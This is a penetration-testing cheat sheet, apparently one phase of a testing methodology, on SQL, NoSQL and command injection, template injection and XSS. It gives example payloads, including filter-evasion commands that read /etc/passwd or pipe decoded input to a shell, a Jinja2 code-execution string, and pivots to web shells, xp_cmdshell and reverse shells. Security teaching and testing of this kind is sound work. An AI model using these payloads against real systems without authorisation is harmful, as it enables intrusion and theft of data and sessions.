# Injection Attacks

## 🎯 Goal
Understand how the application processes user input before evaluating it. Identify if the input reaches a backend subsystem (Database, OS Shell, Template Engine) un-sanitized.

---

## 💉 1. SQL Injection (SQLi)

Focus on areas where parameters are heavily relied upon (IDs, Search queries, Sorting).

- **Error-Based:** Append `'`, `"`, or `\` to parameters. Look for syntax errors (e.g., `You have an error in your SQL syntax;`).
- **Union-Based:** Append `UNION SELECT 1,2,3...` and keep incrementing until the page loads normally. Find the visible columns and extract data (e.g., `UNION SELECT 1,@@version,3`).
- **Blind (Boolean):** If no errors or data returns, inject true/false statements. E.g., `id=1' AND 1=1--` (loads normally) vs `id=1' AND 1=2--` (loads empty or errors).
- **Blind (Time-Based):** If boolean fails, force the database to sleep. E.g., `id=1'; WAITFOR DELAY '0:0:5'--` (MSSQL) or `id=1' AND SLEEP(5)--` (MySQL).

## 🗄️ 2. NoSQL Injection

Modern JS applications (MEAN/MERN stack) often use MongoDB. Injection here is JSON/Object based.

- **Operator Injection:** Instead of passing a string `{"username": "admin"}`, pass an operator `{"username": {"$ne": null}}`.
- **Regex Injection:** Bypass login by injecting a regular expression `{"password": {"$regex": "^a"}}`. Keep guessing letters until you log in.
- **SSJS (Server-Side JavaScript):** `mongo` evaluates JS commands. Inject `; sleep(5000)` into JSON payloads.

## 💻 3. Command Injection

Often found in diagnostic tools (Ping, Traceroute), image parsers, or file upload handlers.

- **Basic Delimiters:** Try appending `;`, `|`, `||`, `&&` to your input.
  E.g., `[IP] ; whoami` or `[IP] | id`.
- **Backticks/Command Substitution:** Try `` `id` `` or `$(id)` inside expected string inputs.
- **Bypassing Filters (WAFs or Input Validation):**
  - Space bypass: `${IFS}` (e.g., `cat${IFS}/etc/passwd`) or `<` (e.g., `cat</etc/passwd`).
  - Blacklisted Strings: Base64 decode it (`echo "aWQ=" | base64 -d | sh`) or concatenate it (`c''a''t /et''c/p''asswd`).

## ⚙️ 4. Server-Side Template Injection (SSTI)

When building dynamic HTML, user input might be parsed by a template engine instead of safely escaped.

- **Detection:** Input mathematical equations into profile fields/names. E.g., `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`. If it evaluates to `49`, you have SSTI.
- **Exploitation:** Find the engine (Jinja2, Twig, FreeMarker, Ruby/ERB) using HackTricks payloads.
- **RCE via Jinja2:** `{{ ''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate()[0] }}` (The index `407` changes server to server, use `tplmap` or fuzz).

## 🧪 5. Cross-Site Scripting (XSS)

XSS is a client-side execution running within the context of the user's browser session.

- **Reflected (Phishing/Stealing):** Payload is in the URL. Send to victim -> Steal Cookies / CSRF Token -> Profit. Needs an action (e.g. search bar, error messages).
- **Stored (Worms/ATO):** Payload saved in DB. E.g., Comment section, Profile Name. Every user viewing the page gets executed.
- **DOM-Based (Client-Flow):** Payload processed by JS on the client entirely, never reaching the server DB. Look for `eval()`, `innerHTML`, `document.write`.
- **XSS to RCE (The Ultimate Pivot):** Can you use XSS in an Admin Panel (Stored) to force the admin browser to interact with a system setting (e.g. uploading a plugin, adding an SSH key, changing a config)?

---

## 🔗 Pivot Opportunities

| Observation | Possible Pivot |
|-------------|----------------|
| SQLi (MySQL with FILE privileges) | Write a PHP shell into the web root `SELECT INTO OUTFILE` |
| SQLi (MSSQL) | Enable `xp_cmdshell` for complete OS command execution |
| Stored XSS | Hijack administrator session cookie, gaining access to the backend Admin panel |
| Command Injection | Pop a reverse shell to your Attacker machine -> Begin Phase 6 (PrivEsc) |

---

## 📚 References
- SQLMap
- PortSwigger - SQLi, Command Injection, XSS
- PayloadAllTheThings - SSTI, NoSQL
